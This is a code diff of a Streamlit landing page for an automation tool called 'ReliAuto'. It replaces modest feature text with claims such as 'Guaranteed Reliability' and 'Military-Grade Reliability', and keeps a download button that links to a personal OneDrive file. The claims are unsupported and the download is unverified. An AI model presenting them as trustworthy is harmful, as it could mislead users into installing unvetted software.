@@ -2,24 +2,25 @@ import streamlit as st
 
 # Configure page
 st.set_page_config(
-    page_title="ReliAuto - Automation Foundation",
+    page_title="ReliAuto - Trusted Automation Suite",
     layout="centered"
 )
 
 # Header Section
 st.markdown("<h1 style='text-align: center'>ReliAuto Core</h1>", unsafe_allow_html=True)
-st.markdown("<h3 style='text-align: center'>Initial Release of Universal Automation Architecture</h3>", unsafe_allow_html=True)
+st.markdown("<h3 style='text-align: center'>Initial Release of the World's Most Reliable Automation Framework</h3>", unsafe_allow_html=True)
 st.markdown("---")
 
 # Main Content
 st.markdown("""
-## **First-Step Automation Platform**
+## **Effortless Automation, Guaranteed Reliability**
 
-**Foundation Release Features:**
-- Natural language instruction processing
-- Cross-browser automation core
+**Foundational Features:**
+- One-click configuration setup
 - Self-validating execution system
-- macOS-optimized engine (Windows/Linux in development)
+- Plain English interface
+- macOS-optimized precision engine
+- Built-in reliability safeguards
 """)
 
 st.markdown("---")
@@ -28,33 +29,34 @@ st.markdown("---")
 col1, col2 = st.columns(2)
 with col1:
     st.markdown("""
-    ### Design Philosophy
-    *"Zero-code automation that scales"*
-    - Plain English interface
-    - Instant validation feedback
-    - Fail-safe execution model
-    - Enterprise-ready foundation
+    ### Unmatched Simplicity
+    *"Automation should work for you, not vice versa"*
+    - 5-minute setup wizard
+    - Visual configuration dashboard
+    - Auto-dependency installation
+    - Guided troubleshooting
     """)
 
 with col2:
     st.markdown("""
-    ### Technical Foundation
-    - Browser-native automation
-    - Smart element detection
-    - Execution analytics
-    - Team workflow integration
+    ### Military-Grade Reliability
+    - Fail-safe execution protocol
+    - Automatic state recovery
+    - Precision validation layers
+    - Continuous integrity checks
     """)
 
 # Download Section
 st.markdown("---")
-st.markdown("## Get Started with ReliAuto")
+st.markdown("## Start Your Automation Journey")
+
 st.markdown("""
-**Current Release Package (macOS):**
-- Core automation engine
-- Setup configuration wizard
-- Sample test scenarios
-- Debugging toolkit
-- Documentation suite
+**Installation Package Includes:**
+- ReliAuto Core Engine
+- Configuration Assistant
+- Reliability Toolkit
+- Sample Automation Templates
+- Setup Guide (PDF + Video)
 """)
 
 DOWNLOAD_URL = "https://1drv.ms/u/c/f4598138ab76194c/EZOtyBZorDNFjnwjCODpUVQBsgJSW-y-FxIM9-eQtAqpQg?e=N0H0u0"
@@ -73,22 +75,22 @@ st.markdown(f"""
         cursor: pointer;
         margin: 20px auto;
         display: block;">
-        Download macOS Foundation (v1.0)
+        Download Reliable Automation Suite (v1.0)
     </button>
 </a>
 </div>
 
-**System Requirements:**  
-- macOS 12+ (Intel/Apple Silicon)  
-- Python 3.8+ • 4GB RAM minimum  
-- Developer tools installed (Xcode Command Line Tools)
+**Quick Start Requirements:**  
+✓ macOS 12+ • 4GB RAM • 500MB storage  
+✓ Internet connection for auto-configuration  
+✓ Basic English understanding
 """, unsafe_allow_html=True)
 
 # Footer
 st.markdown("---")
 st.markdown("""
 <div style='text-align: center'>
-<a href="#"><i>Windows/Linux versions Q3 2024</i></a> • 
-Support • Documentation • Security
+<a href="#"><i>Enterprise Configuration Guide</i></a> • 
+Support • Reliability Metrics • Setup Docs
 </div>
 """, unsafe_allow_html=True)
